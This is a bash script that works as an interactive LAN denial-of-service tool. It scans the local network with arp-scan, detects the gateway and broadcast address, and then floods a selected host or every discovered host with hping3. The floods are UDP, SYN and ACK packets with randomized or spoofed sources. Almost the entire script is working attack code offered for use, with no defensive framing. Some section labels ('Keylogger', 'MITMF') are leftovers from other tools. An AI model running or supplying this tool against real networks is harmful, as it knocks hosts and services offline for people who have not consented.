#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green
    YW=$(tput setaf 226)  # Yellow
    OR=$(tput setaf 208)  # Orange
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

#╔══════════════════════════════════════════════╗
#║	Verify the folder of Temporary files
#╚══════════════════════════════════════════════╝
	GHping_FOLDER="GHping$(date "+%T" | tr -d ":")"
	Temp_GHping="/tmp/${GHping_FOLDER}"
	Dir=`ls /tmp | grep -E ^${GHping_FOLDER}$`
		if [ "$Dir" != "" ];then
		  rm -rf ${Temp_GHping}
		  mkdir ${Temp_GHping}
		else
		  mkdir ${Temp_GHping}
		fi
#╚══════════════════════════════  End Function ═╝

#╔══════════════════════════════════════════════╗
#║	Exit and Clear temp files
#╚══════════════════════════════════════════════╝
	FUNC_Exit() {
		killall hping3 &>/dev/null
		echo ""
		echo ""
		echo -e "${WH} [${RD}!${WH}] Stoped attack."
		echo ""
		echo -e "${WH} [${RD}!${WH}] Remove temporary file ."
		rm -rf ${Temp_GHping}
		sleep 1
		echo ""
		exit
	}
#╚══════════════════════════════  End Exit and Clear temp files ═╝

#╔══════════════════════════════════════════════╗
#║	Back to menu
#╚══════════════════════════════════════════════╝
	FUNC_int_enter()
		{
			echo -en "\n Press Enter to continue"
			read
			clear
		}
#╚══════════════════════════════  End Back to menu ═╝

#╔══════════════════════════════════════════════╗
#║	bar progress
#╚══════════════════════════════════════════════╝
# ══ Progress bar ════════╗ START ╔═
	FUNC_progress_bar()
		{
			function ProgressBar {
			# Process data
			    let _progress=(${1}*100/${2}*100)/100
			    let _done=(${_progress}*2)/10
			    let _left=20-$_done
			# Build progressbar string lengths
			    _fill=$(printf "%${_done}s")
			    _empty=$(printf "%${_left}s")
					printf "\r      ${BD}${RD}Attack:${BD}${WH}[${BD}${GR}${_fill// /#}${_empty// /-}${BD}${WH}] ${BD}${GR}${_progress}%%"
			}
			# Variables
			# _start=1
			# _end=100
				for number in $(seq ${_start} ${_end})
					do
					    sleep 1
					    ProgressBar ${number} ${_end}
				done
		}
# ══ Progress bar ════════╝  END  ╚═
#╚══════════════════════════════  End bar progress ═╝

#╔══════════════════════════════════════════════╗
#║	GET INFO for MITMF
#╚══════════════════════════════════════════════╝
	FUNC_Getinfo() {
		clear
		echo -e " ${PR}+------------------------+"
		echo -e " ${PR}|    ${NM}${YW}SELECT INTERFACE    ${NM}${PR}|"
		echo -e " ${PR}+------------------------+"
		echo -en "${NM}${WH}"
		ip link show up | grep -E -o '.*>' | awk -F ':' '{print $2}' | nl -s ')' 2>/dev/null
		echo -e " ${NM}${PR}+------------------------+"
		echo -e ""
		echo -en " ${SVC}${WH}[${RD}!${WH}] ${GR}Enter NUM for scan ${NM}${BD}${CY}> ${BD}${RD}"
		read NUM
		clear
		INTERFACE=`ip link show up | grep -E -o '.*>' | awk -F ':' '{print $2}' | nl -s ')' | grep "$NUM)" | awk '{print $2}' 2>/dev/null`
		arp-scan -l -I ${INTERFACE}| grep -wE '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}' > ${Temp_GHping}/ipscan.txt
		VAR1=0
		traceroute 192.168.99.99 > ${Temp_GHping}/iptest.txt &
		traceroute_PID="$!"
		disown $traceroute_PID
		sleep 2
		kill -9 $traceroute_PID &> /dev/null
		GATEWAY=`cat ${Temp_GHping}/iptest.txt | sed '2!D' | grep -Eoa '\(.*\)' | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' | sort -u | tail -n1`
		MASK=`echo $GATEWAY | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'`
		TARGET_LIST="all"
		IFACE=`route -n | grep -w "${MASK}0 .* ${INTERFACE}" | awk '{print $8}'`
		MYIP=`ip route | grep -w "${MASK}0/24 .* ${INTERFACE}" | awk '{print $9}'`
		BROADCAST=`ifconfig $IFACE | grep -w "broadcast" | awk '{print $6}'`
	}
#╚══════════════════════════════  End GET INFO for MITMF ═╝

#╔══════════════════════════════════════════════╗
#║	Set tittle attack
#╚══════════════════════════════════════════════╝
	FUNC_Title ()
	 	{
			echo -e " ${NM}${YW}|===========================================|"
			if [[ "$TARGET_LIST" == "all" ]]
				then
					echo -e " ${NM}${YW}| ${NM}${BL}TARGET     ${NM}${CY}>>  ${NM}${RD}$TARGET_LIST ${NM}${YW}(${BD}${WH}${Num_targets}${NM}${YW})"
				else
					echo -e " ${NM}${YW}| ${NM}${BL}TARGET     ${NM}${CY}>>  ${NM}${RD}$TARGET_LIST"
			fi
			echo -e " ${NM}${YW}| ${NM}${BL}GATEWAY    ${NM}${CY}>>  ${NM}${WH}$GATEWAY"
			echo -e " ${NM}${YW}| ${NM}${BL}BROADCAST  ${NM}${CY}>>  ${NM}${WH}$BROADCAST"
			echo -e " ${NM}${YW}| ${NM}${BL}IFACE      ${NM}${CY}>>  ${NM}${GR}$IFACE"
			echo -e " ${NM}${YW}| ${NM}${BL}MY Ip      ${NM}${CY}>>  ${NM}${CY}$MYIP"
			echo -e " ${NM}${YW}|===========================================|"
	 	}
#╚══════════════════════════════  End Set tittle attack ═╝

#╔══════════════════════════════════════════════╗
#║	Inter specific target
#╚══════════════════════════════════════════════╝
	FUNC_Change_target() {
		echo ""
		echo -e " ${NM}${YW}+----------- ${BD}${WH}Result scaning lan ${NM}${YW}------------+"
		while read IP MAC INFO
			do
				echo -e " ${NM}${YW}| ${NM}${GR}${IP} ${RD}>> ${PR}${INFO} "
		done < ${Temp_GHping}/ipscan.txt
		echo -e " ${NM}${YW}+-------------------------------------------+"
		echo ""
		echo -en " ${NM}${WH}[${RD}!${WH}] ${GR}Enter Specify the Target ${Blue}>> ${BD}${CY}${MASK}"
		read SPEC_TARGET
		if [[ "$SPEC_TARGET" == "all" ]]
			then
				TARGET_LIST="all"
			else
				TARGETS=`echo -e "${MASK}${SPEC_TARGET}"`
				TARGET_LIST=`echo -e "${MASK}${SPEC_TARGET}"`
		fi
		selecti=0

	}
#╚══════════════════════════════  End Inter specific target ═╝

#╔══════════════════════════════════════════════╗
#║	FUNCction Keylogger
#╚══════════════════════════════════════════════╝
	FUNC_Attack() {
		clear
		echo -e " ${NM}+-------------------------------------------+"
		echo -e " ${NM}|        ${NM}${RD}-=     ATTACK hping3     =-        ${NM}|"
		echo -e " ${NM}+-------------------------------------------+"
		FUNC_Title
		if [[ "$TARGET_LIST" == "all" ]]
			then
 				_start=1
				let _end=11*${Num_targets}
				FUNC_progress_bar
				while read IP MAC INFO
		 			do
						Attacked=$(timeout 10s hping3 --flood --rand-source --udp -n -d 120 -p 53 $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --rand-source -A -d 80 -p 80 $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --rand-source -S -d 80 -p 80 $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --flood --rand-source -S -n -d 120 -p 80 $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --rand-source -A -X $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --rand-source -A -Y $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --spoof -S -p 80 $BROADCAST $IP -I ${INTERFACE} 2>/dev/null  &) &
						Attacked=$(timeout 10s hping3 --faster --spoof -A -p 80 $BROADCAST $IP -I ${INTERFACE} 2>/dev/null  &) &
						sleep 10
				done < ${Temp_GHping}/ipscan.txt
			else
				_start=1
				_end=61
				Attacked=$(timeout 60s hping3 --flood --rand-source --udp -n -d 120 -p 53 $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --rand-source -A -d 80 -p 80 $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --rand-source -S -d 80 -p 80 $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --flood --rand-source -S -n -d 120 -p 80 $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --rand-source -A -X $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --rand-source -A -Y $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --spoof -S -p 80 $BROADCAST $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				Attacked=$(timeout 60s hping3 --faster --spoof -A -p 80 $BROADCAST $TARGETS -I ${INTERFACE} 2>/dev/null  &) &
				FUNC_progress_bar
		fi
		echo -e ""
		echo -e " ${RD}+-------------------------------------------+"
		echo -e " ${RD}|        ${BD}${RD}-= ATTACK hping3 stoped! =-        ${NM}${RD}|"
		echo -e " ${RD}+-------------------------------------------+"
		selecti=0
	}
#╚══════════════════════════════  End FUNCction Keylogger ═╝

#╔══════════════════════════════════════════════╗
#║	Basic FUNCctions
#╚══════════════════════════════════════════════╝
	trap FUNC_Exit SIGINT
	clear
	FUNC_Getinfo
	selecti=
	until [[ "selecti" = "0" ]]; do
			Num_targets=`cat ${Temp_GHping}/ipscan.txt 2> /dev/null | wc -l`
		clear
			echo ""
			echo -e " ${NM}+-------------------------------------------+"
			echo -e " ${NM}|        ${BD}${RD}-=     ATTACK hping3     =-        ${NM}|"
			echo -e " ${NM}+-------------------------------------------+"
			FUNC_Title
			echo -e "${NM}${WH}  +${NM}${CY}-----------------------------------------${NM}${WH}+"
			echo -e "  ${NM}${CY}|${NM}${WH} [${RD}1${NM}${WH}] ${BD}${CY} >  ${NM}${GR}Start Attack                    ${NM}${CY}|"
			echo -e "  ${NM}${CY}|${NM}${WH} [${RD}2${NM}${WH}] ${BD}${CY} >  ${NM}${WH}Change Targets                  ${NM}${CY}|"
			echo -e "  ${NM}${CY}|                                         ${NM}${CY}|"
			echo -e "  ${NM}${CY}|${NM}${WH} [${RD}0${NM}${WH}] ${BD}${CY} >  ${BD}${WH}Exit                            ${NM}${CY}|"
			echo -e "${NM}${WH}  +${NM}${CY}-----------------------------------------${NM}${WH}+"
			echo -e " ${BD}${CY}+-------------------------------------------+"
			echo ""
			echo -en " ${NM}${WH}[${RD}!${WH}] ${GR}Enter number menu${NM}${WH}: ${BD}${RD}"
		read selecti
		case $selecti in
			1 ) FUNC_Attack ; FUNC_int_enter ;;
			2 ) FUNC_Change_target ;;
			0 ) clear ; FUNC_Exit ;;
			* ) echo "Please enter 1..2 or 0"; FUNC_int_enter
		esac
	done
#╚══════════════════════════════  End Basic FUNCctions ═╝